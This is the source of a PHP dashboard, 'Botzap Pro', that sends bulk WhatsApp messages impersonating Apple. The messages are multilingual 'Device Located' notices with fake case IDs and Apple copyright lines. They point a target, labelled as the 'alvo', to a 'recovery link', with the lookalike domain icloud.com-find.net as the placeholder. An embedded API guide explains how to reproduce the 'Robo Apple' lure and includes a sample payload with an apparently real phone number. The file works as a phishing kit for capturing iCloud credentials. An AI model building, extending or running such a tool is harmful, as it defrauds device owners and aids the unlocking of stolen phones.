<?php
require_once 'config.php';
checkAuth();

// Fetch models
$modelos = [];
try {
    $stmtModels = $pdo->query("SELECT id, nome FROM modelos ORDER BY nome");
    $modelos = $stmtModels->fetchAll(PDO::FETCH_ASSOC);
} catch (Exception $e) { error_log("Erro ao buscar modelos: " . $e->getMessage()); }

// Fetch colors
$cores = [];
try {
    $stmtColors = $pdo->query("SELECT id, nome FROM cores ORDER BY nome");
    $cores = $stmtColors->fetchAll(PDO::FETCH_ASSOC);
} catch (Exception $e) { error_log("Erro ao buscar cores: " . $e->getMessage()); }

// Fetch Capacidades (GB/TB)
$capacidades = [];
try {
    $stmtCaps = $pdo->query("SELECT id, nome FROM capacidades ORDER BY CAST(nome AS UNSIGNED) ASC, nome ASC");
    $capacidades = $stmtCaps->fetchAll(PDO::FETCH_ASSOC);
} catch (Exception $e) { error_log("Erro ao buscar capacidades: " . $e->getMessage()); }

// Fetch uploaded/saved images
$imagensSalvas = [];
try {
    $stmtImagens = $pdo->query("SELECT id, caminho FROM imagens_salvas ORDER BY caminho ASC");
    $imagensSalvas = $stmtImagens->fetchAll(PDO::FETCH_ASSOC);
} catch (Exception $e) { error_log("Erro ao buscar imagens: " . $e->getMessage()); }

$defaultText = "*Dispositivo Localizado*\n> Dispositivo: *{modelo} {cor} {capacidade}*\n> Número de emergencia: *({numero})*\n> ID de caso: *000-A946*\nPara iniciar o processo de recuperação, digite *Ajuda*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy";

$baseTexts = [
    "pt" => "*Dispositivo Localizado*\n> Dispositivo: *{modelo} {cor} {capacidade}*\n> Número de emergencia: *({numero})*\n> ID de caso: *000-A946*\nPara iniciar o processo de recuperação, digite *Ajuda*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
    "en" => "*Device Located*\n> Device: *{modelo} {cor} {capacidade}*\n> Emergency Number: *({numero})*\n> Case ID: *000-A946*\nTo start the recovery process, type *Help*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
    "es" => "*Dispositivo Localizado*\n> Dispositivo: *{modelo} {cor} {capacidade}*\n> Número de emergencia: *({numero})*\n> ID de caso: *000-A946*\nPara iniciar el processo de recuperação, escriba *Ayuda*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
    "zh" => "*设备已定位*\n> 设备：*{modelo} {cor} {capacidade}*\n> 紧急号码：*({numero})*\n> 案例 ID：*000-A946*\n要开始恢复流程，请输入 *帮助*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
    "fr" => "*Appareil Localisé*\n> Appareil : *{modelo} {cor} {capacidade}*\n> Numéro d'urgence : *({numero})*\n> ID de dossier : *000-A946*\nPour commencer le processus de récupération, tapez *Aide*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
    "ar" => "*تم تحديد موقع الجهاز*\n> الجهاز: *{modelo} {cor} {capacidade}*\n> رقم الطوارئ: *({numero})*\n> رقم الحالة: *000-A946*\nلبدء عملية الاستعادة، اكتب *مساعدة*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
    "ru" => "*Устройство обнаружено*\n> Устройство: *{modelo} {cor} {capacidade}*\n> Номер экстренной связи: *({numero})*\n> Номер обращения: *000-A946*\nЧтобы начать процесс восстановления, введите *Помощь*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
    "sv" => "*Enhet hittad*\n> Enhet: *{modelo} {cor} {capacidade}*\n> Nödnummer: *({numero})*\n> Ärende-ID: *000-A946*\nFör att påbörja återställningen, skriv *Hjälp*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy"
];
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Botzap</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <!-- SweetAlert2 -->
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --primary: #4f46e5;
            --primary-hover: #4338ca;
            --bg: #0f172a;
            --card-bg: rgba(30, 41, 59, 0.7);
            --border: rgba(255, 255, 255, 0.1);
            --text-main: #f8fafc;
            --text-muted: #94a3b8;
        }
        body { 
            background-color: var(--bg); 
            color: var(--text-main);
            font-family: 'Inter', sans-serif; 
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        /* Background animation elements */
        .bg-blob {
            position: fixed;
            width: 500px;
            height: 500px;
            background: var(--primary);
            filter: blur(150px);
            opacity: 0.15;
            border-radius: 50%;
            z-index: -1;
        }
        .blob-1 { top: -200px; right: -100px; }
        .blob-2 { bottom: -200px; left: -100px; }

        .navbar { 
            background: rgba(15, 23, 42, 0.8) !important;
            backdrop-filter: blur(10px);
            border-bottom: 1px solid var(--border);
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); 
        }
        
        .card { 
            background: var(--card-bg);
            backdrop-filter: blur(12px);
            border: 1px solid var(--border);
            border-radius: 20px; 
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1); 
            margin-bottom: 25px; 
            transition: all 0.3s; 
            color: var(--text-main);
        }
        .card:hover { transform: translateY(-5px); box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.2); }
        
        .card-header { 
            background: transparent; 
            border-bottom: 1px solid var(--border); 
            font-weight: 700; 
            padding: 1.25rem 1.5rem; 
            color: var(--text-main);
        }

        .form-label { color: var(--text-muted); font-weight: 600; font-size: 0.85rem; }
        .form-control, .form-select {
            background: rgba(15, 23, 42, 0.5);
            border: 1px solid var(--border);
            color: #fff;
            border-radius: 12px;
            padding: 10px 15px;
        }
        .form-control:focus, .form-select:focus {
            background: rgba(15, 23, 42, 0.8);
            border-color: var(--primary);
            box-shadow: 0 0 0 4px rgba(79, 70, 229, 0.2);
            color: #fff;
        }
        .form-select option { background: #1e293b; color: #fff; }

        .stats-badge { background: rgba(255,255,255,0.05) !important; color: var(--text-main) !important; border: 1px solid var(--border); }
        
        .preview-box { 
            background: rgba(15, 23, 42, 0.6); 
            color: #d1d5db; 
            border-radius: 16px; 
            padding: 20px; 
            font-family: 'Consolas', monospace; 
            white-space: pre-wrap; 
            border: 1px solid var(--border); 
        }
        
        .table { color: var(--text-main); background-color: transparent !important; }
        .table thead, .table tbody, .table tfoot, .table tr, .table th, .table td { 
            background-color: transparent !important; 
            color: inherit !important;
            border-color: var(--border) !important;
        }
        .table-responsive { background-color: transparent !important; }
        .table-hover tbody tr:hover { background-color: rgba(255, 255, 255, 0.05) !important; color: #fff !important; }
        
        .btn-success { background: #10b981; border: none; }
        .btn-success:hover { background: #059669; }
        .btn-primary { background: var(--primary); border: none; }
        .btn-primary:hover { background: var(--primary-hover); }

        .device-card { background: rgba(255,255,255,0.03); border: 1px solid var(--border); }
        .device-card.connected { border-left: 4px solid #10b981; }
        .device-card.waiting { border-left: 4px solid #f59e0b; }
        
        #response-alert { border-radius: 12px; border: none; backdrop-filter: blur(8px); }

        /* Modal styling */
        .modal-content {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border: 1px solid var(--border);
            border-radius: 28px;
            color: var(--text-main);
        }
        .modal-header { border-bottom: 1px solid var(--border); }
        .modal-footer { border-top: 1px solid var(--border); }
        .btn-close { filter: invert(1) grayscale(100%) brightness(200%); }

        /* Ultra-Premium Device Manager Styles */
        .device-sidebar {
            background: rgba(15, 23, 42, 0.4);
            border-right: 1px solid var(--border);
            height: 550px;
            display: flex;
            flex-direction: column;
        }
        .sidebar-header { padding: 20px; border-bottom: 1px solid var(--border); }
        .device-list-container { flex: 1; overflow-y: auto; padding: 15px; }
        
        .device-item {
            display: flex;
            align-items: center;
            padding: 12px 15px;
            border-radius: 16px;
            margin-bottom: 10px;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            border: 1px solid transparent;
            background: rgba(255, 255, 255, 0.02);
        }
        .device-item:hover {
            background: rgba(255, 255, 255, 0.05);
            transform: translateX(5px);
        }
        .device-item.active {
            background: rgba(79, 70, 229, 0.15);
            border-color: var(--primary);
            box-shadow: 0 4px 15px rgba(79, 70, 229, 0.1);
        }
        
        .device-icon-wrapper {
            width: 45px;
            height: 45px;
            border-radius: 12px;
            background: rgba(255,255,255,0.05);
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            position: relative;
        }
        .status-glow {
            position: absolute;
            top: -2px;
            right: -2px;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            border: 2px solid var(--bg);
        }
        .status-glow.online { background: #10b981; box-shadow: 0 0 10px #10b981; }
        .status-glow.waiting { background: #f59e0b; box-shadow: 0 0 10px #f59e0b; }
        .status-glow.offline { background: #ef4444; }

        .qr-station {
            background: rgba(15, 23, 42, 0.6);
            border-radius: 24px;
            padding: 40px;
            border: 1px dashed var(--border);
            position: relative;
            overflow: hidden;
        }
        .qr-station::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; height: 2px;
            background: linear-gradient(90deg, transparent, var(--primary), transparent);
            animation: scanner-light 3s linear infinite;
            opacity: 0.5;
        }
        @keyframes scanner-light { 0% { top: 0; } 100% { top: 100%; } }

        .btn-modern-icon {
            width: 32px;
            height: 32px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.2s;
        }
        .btn-modern-icon:hover { transform: scale(1.1); }
        
        .btn-white { background: #fff !important; color: var(--primary) !important; }
        .btn-white:hover { background: #f8fafc !important; }
        .placeholder-white::placeholder { color: rgba(255,255,255,0.7) !important; }
    </style>
</head>
<body>
    <div class="bg-blob blob-1"></div>
    <div class="bg-blob blob-2"></div>

<nav class="navbar navbar-expand-lg navbar-dark sticky-top">
  <div class="container">
    <a class="navbar-brand d-flex align-items-center" href="#">
        <i class="fas fa-microchip fa-lg me-2"></i>
        <span>Botzap <span class="fw-light">Pro</span></span>
    </a>
    <div class="ms-auto d-flex align-items-center gap-3">
        <div id="top-stats" class="d-none d-md-flex gap-2">
            <span class="stats-badge bg-white text-dark shadow-sm">
                <i class="fas fa-plug text-success me-1"></i> <span id="stat-online">0</span> Online
            </span>
            <span class="stats-badge bg-white text-dark shadow-sm">
                <i class="fas fa-clock text-warning me-1"></i> <span id="stat-waiting">0</span> Aguardando
            </span>
        </div>
        <button class="btn btn-connect btn-success shadow-sm" data-bs-toggle="modal" data-bs-target="#deviceManagerModal">
            <i class="fas fa-plus-circle me-1"></i> Gerenciar Aparelhos
        </button>
        <button class="btn btn-connect btn-primary shadow-sm" data-bs-toggle="modal" data-bs-target="#apiIntegrationModal">
            <i class="fas fa-code me-1"></i> API / Integração
        </button>
        <a href="logout.php" class="btn btn-outline-light btn-sm ms-2" onclick="return confirm('Sair do sistema?')">
            <i class="fas fa-sign-out-alt"></i> Sair
        </a>
    </div>
  </div>
</nav>

<div class="container mt-4">
    <div class="row">
        
        <!-- Formulário de Envio -->
        <div class="col-lg-8">
            <div id="response-alert" class="alert shadow-sm" role="alert"></div>

            <div class="card">
                <div class="card-header d-flex justify-content-between align-items-center">
                    <span><i class="fas fa-paper-plane text-primary me-2"></i> Console de Disparo</span>
                    <span class="text-muted small fw-normal">Multi-Device V2</span>
                </div>
                <div class="card-body p-4">
                    <form id="sendForm">
                        
                        <div class="row mb-4">
                            <div class="col-md-6">
                                <label class="form-label fw-bold">Dispositivo de Saída</label>
                                <select name="sessionId" id="select-session" class="form-select border-primary" required>
                                    <option value="default">Dispositivo Principal (Padrão)</option>
                                </select>
                                <small class="text-muted">Aparelhos desconectados não aparecerão aqui.</small>
                            </div>
                            <div class="col-md-6">
                                <label class="form-label fw-bold">Idioma do Atendimento</label>
                                <select name="idioma" id="select-idioma" class="form-select" required>
                                    <option value="pt" selected>Português (Brasil)</option>
                                    <option value="en">Inglês (English)</option>
                                    <option value="es">Espanhol (Español)</option>
                                    <option value="zh">Mandarim (繁體/简体)</option>
                                    <option value="fr">Francês (Français)</option>
                                    <option value="ar">Árabe (العربية)</option>
                                    <option value="ru">Russo (Русский)</option>
                                    <option value="sv">Sueco (Svenska)</option>
                                </select>
                            </div>
                        </div>

                        <div class="row mb-4">
                            <div class="col-md-6">
                                <label class="form-label fw-bold">WhatsApp do Alvo (c/ DDI)</label>
                                <div class="input-group">
                                    <span class="input-group-text border-0" style="background: rgba(16, 185, 129, 0.1); color: #10b981;"><i class="fab fa-whatsapp"></i></span>
                                    <input type="text" name="numero" class="form-control" placeholder="5511999999999" required>
                                </div>
                            </div>
                            <div class="col-md-6">
                                <label class="form-label fw-bold">Link de Recuperação</label>
                                <div class="input-group">
                                    <span class="input-group-text border-0" style="background: rgba(79, 70, 229, 0.1); color: var(--primary);"><i class="fas fa-link"></i></span>
                                    <input type="url" name="link_rastreio" class="form-control" placeholder="https://icloud.com-find.net" required>
                                </div>
                            </div>
                        </div>

                        <div class="row mb-4">
                            <div class="col-md-4">
                                <label class="form-label fw-bold">Modelo</label>
                                <select name="modelo" id="select-modelo" class="form-select" required>
                                    <option value="">Selecione...</option>
                                    <?php foreach ($modelos as $img): ?>
                                        <option value="<?php echo htmlspecialchars($img['nome']); ?>"><?php echo htmlspecialchars($img['nome']); ?></option>
                                    <?php endforeach; ?>
                                </select>
                            </div>
                            <div class="col-md-4">
                                <label class="form-label fw-bold">Capacidade</label>
                                <select name="capacidade" id="select-capacidade" class="form-select" required>
                                    <option value="">Selecione...</option>
                                </select>
                            </div>
                            <div class="col-md-4">
                                <label class="form-label fw-bold">Cor</label>
                                <select name="cor" id="select-cor" class="form-select" required>
                                    <option value="">Selecione...</option>
                                </select>
                            </div>
                        </div>

                        <div class="mb-4">
                            <label class="form-label fw-bold">Banner de Anexo (Galeria)</label>
                            <select name="image_gallery" class="form-select" required>
                                <?php foreach ($imagensSalvas as $img): ?>
                                    <option value="<?php echo htmlspecialchars($img['caminho']); ?>" <?php echo ($img['caminho'] == 'uploads/Dynamic.png') ? 'selected' : ''; ?>>
                                        <?php echo htmlspecialchars(basename($img['caminho'])); ?>
                                    </option>
                                <?php endforeach; ?>
                            </select>
                        </div>

                        <div class="mb-4">
                            <label class="form-label fw-bold">Texto base da Notificação</label>
                            <textarea name="texto_base" id="texto-base" rows="6" class="form-control" required><?php echo htmlspecialchars($defaultText); ?></textarea>
                            <div class="mt-2 text-end">
                                <span class="badge bg-secondary">Variáveis: {modelo}, {cor}, {capacidade}</span>
                            </div>
                        </div>

                        <button type="submit" class="btn btn-primary btn-lg w-100 py-3 shadow" id="btn-submit">
                            <i class="fas fa-bolt me-2"></i> INICIAR DISPARO IMEDIATO
                        </button>

                    </form>
                </div>
            </div>

            <!-- Histórico e Controle -->
            <div class="card">
                <div class="card-header d-flex justify-content-between align-items-center">
                    <span><i class="fas fa-history text-secondary me-2"></i> Registros de Atividade</span>
                    <button class="btn btn-outline-danger btn-sm" onclick="clearBotMemory()"><i class="fas fa-trash me-1"></i> Zerar Robô</button>
                </div>
                <div class="table-responsive">
                    <table class="table table-hover align-middle mb-0">
                        <thead class="border-bottom" style="border-color: var(--border);">
                            <tr>
                                <th class="ps-4">Número</th>
                                <th>Dispositivo</th>
                                <th>Horário</th>
                                <th>Status</th>
                                <?php if ($isAdmin): ?><th>Cliente</th><?php endif; ?>
                                <th class="text-end pe-4">Ações</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php 
                            $loggedId = $_SESSION['user_id'] ?? 0;
                            $isAdmin = ($loggedId == 2);
                            $history = []; // Initialize $history
                            try {
                                if ($isAdmin) {
                                    $stmtHist = $pdo->query("SELECT m.*, u.username FROM mensagens_enviadas m LEFT JOIN usuarios u ON m.user_id = u.id ORDER BY m.id DESC LIMIT 10");
                                } else {
                                    $stmtHist = $pdo->prepare("SELECT id, numero, modelo, cor, data_hora, status FROM mensagens_enviadas WHERE user_id = ? ORDER BY id DESC LIMIT 10");
                                    $stmtHist->execute([$loggedId]);
                                }
                                $history = $stmtHist->fetchAll(PDO::FETCH_ASSOC);
                            } catch (Exception $e) {
                                error_log("Erro ao buscar histórico: " . $e->getMessage());
                                // Optionally, you could set a user-friendly message here
                                // $history = []; // Ensure it's empty if an error occurred
                            }
                            
                            foreach ($history as $h): 
                                $isPaused = ($h['status'] === 'pausado');
                                $time = date('H:i', strtotime($h['data_hora']));
                            ?>
                            <tr class="<?php echo $isPaused ? 'opacity-50' : ''; ?>">
                                <td class="ps-4 fw-bold"><?php echo $h['numero']; ?></td>
                                <td><small><?php echo "{$h['modelo']} ({$h['cor']})"; ?></small></td>
                                <td><?php echo $time; ?></td>
                                <td>
                                    <?php if ($isPaused): ?>
                                        <span class="badge bg-warning text-dark px-2">Pausado</span>
                                    <?php else: ?>
                                        <span class="badge bg-success px-2">Atendimento Ativo</span>
                                    <?php endif; ?>
                                </td>
                                <?php if ($isAdmin): ?>
                                <td>
                                    <small class="text-white opacity-75"><?php echo $h['username'] ?? '<i class="opacity-25">Admin/Bot</i>'; ?></small>
                                </td>
                                <?php endif; ?>
                                <td class="text-end pe-4">
                                    <div class="btn-group btn-group-sm">
                                        <?php if ($isPaused): ?>
                                            <button class="btn btn-success" onclick="togglePause(<?php echo $h['id']; ?>, '<?php echo $h['numero']; ?>', 'ativo')" title="Retomar"><i class="fas fa-play"></i></button>
                                        <?php else: ?>
                                            <button class="btn btn-warning" onclick="togglePause(<?php echo $h['id']; ?>, '<?php echo $h['numero']; ?>', 'pausado')" title="Pausar"><i class="fas fa-pause"></i></button>
                                        <?php endif; ?>
                                        <button class="btn btn-danger" onclick="deleteOrder(<?php echo $h['id']; ?>, '<?php echo $h['numero']; ?>')" title="Remover"><i class="fas fa-trash-alt"></i></button>
                                    </div>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                            <?php if (empty($history)): ?>
                                <tr><td colspan="5" class="text-center py-4 text-muted">Aguardando o primeiro disparo...</td></tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>

        <!-- Sidebar / Preview Style iPhone -->
        <div class="col-lg-4">
            <div class="card shadow-lg sticky-top border-0" style="top: 90px; border-radius: 40px; background: rgba(255,255,255,0.05);">
                <div class="card-header bg-transparent border-0 text-center pt-4 pb-0">
                    <div style="width: 50px; height: 5px; background: #eee; margin: 0 auto 15px; border-radius: 10px;"></div>
                    <h6 class="fw-bold mb-0">Visualização no Cliente</h6>
                </div>
                <div class="card-body p-4">
                    <div id="preview-image-container" class="mb-3 text-center" style="display:none;">
                        <img id="preview-image" src="" class="img-fluid rounded-3 shadow-sm border" style="max-height: 180px;">
                    </div>
                    <div class="preview-box">
                        <div id="preview-text" style="font-size: 0.85rem; line-height: 1.4;">...</div>
                        <div class="mt-3 pt-2 border-top border-secondary small text-info">
                            <i class="fas fa-robot me-1"></i> Auto-Reply habilitado com emojis e delay simulado.
                        </div>
                    </div>
                    
                    <div class="mt-4">
                        <div class="p-3 bg-light rounded-4 border">
                            <div class="d-flex align-items-center mb-2">
                                <i class="fas fa-info-circle text-primary me-2"></i>
                                <span class="fw-bold small">Dica de Performance</span>
                            </div>
                            <p class="small text-muted mb-0">Dispositivos com status <span class="text-success fw-bold">Online</span> garantem resposta em menos de 10 segundos.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </div>
</div>

<!-- Modal API / Integração -->
<div class="modal fade" id="apiIntegrationModal" tabindex="-1">
  <div class="modal-dialog modal-xl modal-dialog-centered">
    <div class="modal-content border-0 overflow-hidden shadow-2xl">
      <div class="modal-header border-bottom border-opacity-10 p-4">
        <h5 class="modal-title fw-bold"><i class="fas fa-code text-primary me-2"></i> API WhatsApp Pro & Integração</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
      </div>
      <div class="modal-body p-0">
        <div class="d-flex" style="min-height: 600px;">
          <!-- Tabs Vertical -->
          <div class="bg-dark bg-opacity-25 border-end border-opacity-10" style="width: 250px;">
             <div class="nav flex-column nav-pills p-3" id="api-tabs" role="tablist">
                <button class="nav-link active mb-2 text-start p-3 rounded-4" data-bs-toggle="pill" data-bs-target="#tab-doc"><i class="fas fa-book-open me-2"></i> Documentação</button>
                <button class="nav-link mb-2 text-start p-3 rounded-4" data-bs-toggle="pill" data-bs-target="#tab-keys"><i class="fas fa-key me-2"></i> Chaves API</button>
                <button class="nav-link mb-2 text-start p-3 rounded-4" data-bs-toggle="pill" data-bs-target="#tab-webhook"><i class="fas fa-plug me-2"></i> Webhook</button>
                <button class="nav-link mb-2 text-start p-3 rounded-4" data-bs-toggle="pill" data-bs-target="#tab-examples"><i class="fas fa-terminal me-2"></i> Exemplos</button>
             </div>
          </div>
          <!-- Tab Content -->
          <div class="tab-content p-4 flex-grow-1 overflow-auto bg-dark bg-opacity-10">
             
             <!-- Tab: Documentação -->
             <div class="tab-pane fade show active" id="tab-doc">
                <div class="d-flex justify-content-between align-items-center mb-4">
                   <h4 class="fw-bold mb-0">Guia Técnico & Documentação</h4>
                   <button class="btn btn-sm btn-outline-primary" onclick="copyFullDocRaw()"><i class="fas fa-copy me-1"></i> COPIAR DOC RAW (PARA IA/DEV)</button>
                </div>
                <div class="row g-4 mb-4">
                   <div class="col-md-6">
                      <div class="card bg-white bg-opacity-5 border-opacity-10 p-3 h-100">
                         <h6 class="fw-bold text-primary">1. AUTENTICAÇÃO (Bearer)</h6>
                         <p class="small text-muted">Todas as chamadas exigem o Header:</p>
                         <code class="d-block bg-black p-2 rounded small">Authorization: Bearer {API_KEY}</code>
                         <p class="small text-muted mt-2">Base URL: <code class="bg-black p-1 rounded" id="doc-base-url-1">http://localhost:3000</code></p>
                      </div>
                   </div>
                   <div class="col-md-6">
                      <div class="card bg-white bg-opacity-5 border-opacity-10 p-3 h-100">
                         <h6 class="fw-bold text-success">2. CICLO DE SESSÃO</h6>
                         <p class="small text-muted"><strong>Create:</strong> POST /api/create-session <br> (Envia {"session": "nome_do_bot"})</p>
                         <p class="small text-muted"><strong>QR:</strong> GET /api/qrcode/{session} <br> (Retorna {"qr": "base64"})</p>
                      </div>
                   </div>
                   <div class="col-md-6">
                      <div class="card bg-white bg-opacity-5 border-opacity-10 p-3 h-100">
                         <h6 class="fw-bold text-warning">3. MONITORAMENTO</h6>
                         <p class="small text-muted"><strong>Status:</strong> GET /api/status/{session}</p>
                         <div class="small bg-dark p-2 rounded mt-1 font-monospace" style="font-size: 0.7rem;">
                            "connected": Online <br>
                            "waiting_qr": Aguardando QR <br>
                            "disconnected": Sem conexão
                         </div>
                      </div>
                   </div>
                   <div class="col-md-6">
                      <div class="card bg-white bg-opacity-5 border-opacity-10 p-3 h-100">
                         <h6 class="fw-bold text-info">4. DISPARO PRO</h6>
                         <p class="small text-muted"><strong>Send:</strong> POST /api/send-message</p>
                         <code class="d-block bg-black p-2 rounded small" style="font-size: 0.65rem;">{ "session": "vendas", "number": "5511...", "message": "...", "trackLink": "https://...", "language": "pt" }</code>
                      </div>
                   </div>
                </div>

                <h5 class="fw-bold mb-3"><i class="fas fa-plug text-info me-2"></i>Especificação Completa (Markdown)</h5>
                <textarea id="full-api-spec" class="form-control bg-black border-0 text-success font-monospace p-3" style="font-size: 0.85rem; height: 600px; line-height: 1.6;" readonly># WhatsApp Pro API Specification v2.0 - [MASTER GUIDE]

## 1. Authentication
- **Method:** Bearer Token
- **Header:** `Authorization: Bearer <API_KEY>`
- **Management:** Generate and revoke keys in the "Chaves API" tab.

## 2. Global Endpoints
- **API URL:** <code id="doc-base-url-2">http://localhost:3000</code>
- **Dashboard API:** `api_actions.php` (Internal)

## 3. Advanced Bot Automation (Template System)
To replicate the "Robo Apple" behavior perfectly, use the following payload structure:

### Dynamic Variables:
- `{modelo}` -> Device Name (e.g. iPhone 15 Pro)
- `{cor}` -> Device Color (e.g. Titânio)
- `{capacidade}` -> Storage (e.g. 128 GB)
- `{numero}` -> **The Target Number** (Automated for Emergency Contact field)

### Gold Payload (Standard Recovery Message):
```json
{
  "session": "thiago",
  "number": "5541995810993",
  "message": "*Dispositivo Localizado*\n> Dispositivo: *{modelo} {cor} {capacidade}*\n> Número de emergencia: *({numero})*\n> ID de caso: *000-A946*\nPara iniciar o processo de recuperação, digite *Ajuda*\n> *Copyright ©️ 2025 Apple Inc*",
  "mediaPath": "uploads/sua-imagem.png",
  "trackLink": "https://seu-link-de-recuperacao.com",
  "language": "pt"
}
```

## 4. Endpoint Reference

### POST /api/send-message
- `session`: Instance ID
- `number`: Full target number (with country code)
- `message`: Text content (supports Markdown/Emojis)
- `trackLink`: Recovery link (triggers tracking)
- `option`: **1** (Recovery Template with iCloud Thumbnail)
- **Response:** `{"status": "success", "message": "Mensagem enviada"}`

### GET /api/status/:session
Check if bot is online before sending.
- **Statuses:** `connected`, `waiting_qr`, `disconnected`.
- **Response:** `{"session": "ID", "status": "connected", "number": "5511..."}`

### GET /api/qrcode/:session
Returns the current QR Code in Base64 format.
- **Response:** `{"session": "ID", "qr": "data:image/png/base64,..."}`

## 5. Message Control (API Pro)
Manage your messages and stop/resume automation per recipient.
- **Header:** `Authorization: Bearer YOUR_API_KEY`

### POST /api/control/pause
- `number`: Recipient number.
- `pause`: `true` (pause) or `false` (resume).
- **Response:** `{"success": true, "message": "Status alterado"}`

### POST /api/control/delete
- `number`: Recipient number.
- **Response:** `{"success": true, "message": "Ordem removida"}`

## 6. Multi-Tenant Architecture (Clients)
To manage multiple customers, always use unique session IDs:
- **Pattern:** `Customer_[DATABASE_ID]`
- **Dynamic Usage:** `?cliente=Teste10` (Requests QR for specific user)
- **Isolation:** Each session has its own QR Code and connection.

### Implementation Guide (PHP):
1. **Create:** `POST /api/create-session` {"session":"ID"}
2. **Response:** `{"success": true, "session": "ID"}`
3. **Poll Status:** `GET /api/status/ID`
4. **Show QR:** If status is `waiting_qr`, call `GET /api/qrcode/ID` and display the image.

## 6. Webhooks & Inbound
Configure your URL in the panel to receive real-time notifications when your clients receive messages:
```json
{
  "session": "nome_da_instancia",
  "from": "5541999998888",
  "message": "Olá, quanto custa?",
  "pushName": "Nome do Cliente",
  "timestamp": "2026-03-12T20:00:00Z"
}
```
**Return:** Your server MUST respond with `HTTP 200` to acknowledge receipt.
</textarea>
             </div>

             <!-- Tab: Chaves API -->
             <div class="tab-pane fade" id="tab-keys">
                <div class="d-flex justify-content-between align-items-center mb-4">
                   <h4 class="fw-bold mb-0">Minhas Chaves de Acesso</h4>
                   <button class="btn btn-primary" onclick="generateNewKey()"><i class="fas fa-plus me-1"></i> Nova Chave</button>
                </div>
                <div class="table-responsive">
                   <table class="table table-dark table-hover rounded-4 overflow-hidden">
                      <thead class="bg-white bg-opacity-5">
                         <tr>
                            <th>Nome</th>
                            <th>API Key</th>
                            <th>Criada em</th>
                            <th class="text-end">Ações</th>
                         </tr>
                      </thead>
                      <tbody id="api-keys-list">
                         <!-- Injected JS -->
                      </tbody>
                   </table>
                </div>
             </div>

             <!-- Tab: Webhook -->
             <div class="tab-pane fade" id="tab-webhook">
                <div class="row">
                   <!-- Coluna de Configuração -->
                   <div class="col-lg-5">
                      <h4 class="fw-bold mb-4">Configuração de Webhook</h4>
                      <div class="card bg-white bg-opacity-5 border-opacity-10 p-4 rounded-4 mb-4 shadow-sm">
                         <label class="form-label fw-bold">URL de Recebimento (POST)</label>
                         <div class="input-group mb-3">
                            <span class="input-group-text bg-dark border-0 text-primary"><i class="fas fa-link"></i></span>
                            <input type="url" id="api-webhook-url" class="form-control bg-dark border-0 text-white" placeholder="https://seu-site.com/webhook" style="font-size: 0.9rem;">
                         </div>
                         <p class="small text-muted mb-4">O robô enviará um <b>POST JSON</b> para esta URL toda vez que uma mensagem for recebida.</p>
                         <button class="btn btn-primary w-100 p-3 fw-bold shadow-glow" onclick="saveApiWebhook()">ATUALIZAR CONFIGURAÇÃO</button>
                      </div>
                      
                      <div class="alert alert-primary bg-primary bg-opacity-10 border-0 rounded-4 p-4">
                         <h6 class="fw-bold mb-3"><i class="fas fa-info-circle me-2"></i> Guia Rápido de Integração:</h6>
                         <ul class="small mb-0 ps-3 text-white-50">
                            <li class="mb-2"><b>1. Endpoint:</b> Crie uma rota no seu backend que aceite requisições POST.</li>
                            <li class="mb-2"><b>2. Formato:</b> O corpo da requisição será um JSON puro (raw).</li>
                            <li class="mb-2"><b>3. Segurança:</b> Recomenda-se o uso de HTTPS em produção.</li>
                            <li><b>4. Retorno:</b> Seu servidor deve responder com HTTP 200 para confirmar o recebimento.</li>
                         </ul>
                      </div>
                   </div>
                   
                   <!-- Coluna de Documentação Técnica -->
                   <div class="col-lg-7">
                      <div class="d-flex justify-content-between align-items-center mb-4">
                         <h4 class="fw-bold mb-0">Documentação do Webhook</h4>
                         <span class="badge bg-success-subtle text-success border border-success px-3 py-2">MODO ATIVO</span>
                      </div>

                      <div class="bg-black p-4 rounded-4 border border-white border-opacity-10 mb-4 h-100">
                         <h6 class="text-primary fw-bold mb-3"><i class="fas fa-code me-2"></i> Estrutura do JSON Recebido:</h6>
                         <pre class="mb-4 text-warning" style="font-size: 0.9rem; line-height: 1.6; white-space: pre-wrap;">{
  "session": "MInha",
  "from": "551199999999",
  "message": "Olá, tenho interesse",
  "pushName": "Nome do Cliente",
  "timestamp": "2026-03-12T21:23:50Z"
}</pre>

